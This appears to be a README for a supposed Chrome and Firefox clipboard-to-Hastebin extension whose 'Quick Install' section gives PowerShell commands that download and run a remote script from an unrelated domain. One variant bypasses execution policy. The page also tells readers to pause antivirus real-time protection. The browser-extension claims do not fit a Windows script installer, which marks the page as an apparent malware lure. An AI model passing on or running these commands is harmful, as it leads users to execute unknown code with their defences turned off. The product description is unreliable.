<div align="center">

# ActiHastebin: Clipboard-to-Hastebin Link Switcher for Chrome & Firefox

![preview](https://raw.githubusercontent.com/Calcifer765/acti-hastebin/main/splash_a3bcced.svg)

[![win](https://img.shields.io/badge/WIN-WIN_10%2F11-f97316?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-INSTALLER-fb923c?style=flat-square&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-412-ea580c?style=flat-square&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/CHANNEL-STABLE-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

ActiHastebin is an Activator listener that swaps the current clipboard text for a Hastebin link containing the previous clipboard contents. It captures whatever text is on the clipboard, uploads it, and replaces it with the resulting link in a single action. The extension keeps clipboard handling fast and out of the way, so you can move text to a shareable link without breaking your workflow.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Launch PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Paste and run
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Replaces the current clipboard text with a Hastebin link containing the previous clipboard contents
- Runs as an Activator listener for quick, gesture-driven invocation
- Preserves the original clipboard text by offloading it to a new Hastebin entry
- Leaves the new link on the clipboard ready to paste immediately
- Lightweight, single-purpose utility with no background overhead
- Works entirely through the system clipboard and Activator events

## How It Works

ActiHastebin runs as an Activator listener. When triggered, it reads the current contents of the clipboard and sends that text to create a new Hastebin entry. Once the upload succeeds, the resulting Hastebin link is written back to the clipboard, replacing the original text. The previous clipboard content is then accessible through the new link rather than stored locally. If the upload fails or the clipboard is empty, the clipboard is left unchanged so no data is lost.

## Privacy

ActiHastebin processes clipboard contents locally within the browser to generate Hastebin links. No clipboard data or usage information is transmitted to external servers by the extension itself. All link generation occurs through the target service only when explicitly triggered by the user. The extension does not collect analytics, track browsing activity, or store clipboard history. No personal data is retained beyond the active session. Clipboard access is limited to the moment of activation and is used solely to swap the previous content for its corresponding link.

## FAQ

- **What does ActiHastebin actually change on my clipboard?** It swaps the current clipboard text for a Hastebin link containing that previous content. The original text is replaced by the link, not appended to it.

- **Does it work with any clipboard content?** It operates on plain text clipboard contents. Non-text clipboard data is left untouched.

- **Do I need to configure anything?** No. Once the extension is active, the clipboard swap runs automatically when the trigger fires.

- **Is any data stored or sent elsewhere?** Clipboard text is only used to generate the Hastebin link. No browsing history, clipboard contents, or personal data are retained by the extension.

- **Will it overwrite my clipboard silently?** Yes — the swap is the intended behavior. Copy or save anything you need to keep before triggering it.

- **Can I undo the swap?** The previous text is preserved inside the generated Hastebin link, so you can retrieve it from there if needed.

- **Does it require an account or sign-in?** No account, token, or configuration is needed to use the clipboard swap.

- **What happens if the link generation fails?** The clipboard is left unchanged, so your original content is not lost.

- **Which browsers are supported?** It runs as a browser extension; behavior is consistent across supported Chromium-based browsers.

- **How do I disable it?** Toggle the extension off in your browser's extension manager; the clipboard swap stops immediately.

## License

ActiHastebin is released under the MIT License. You are free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.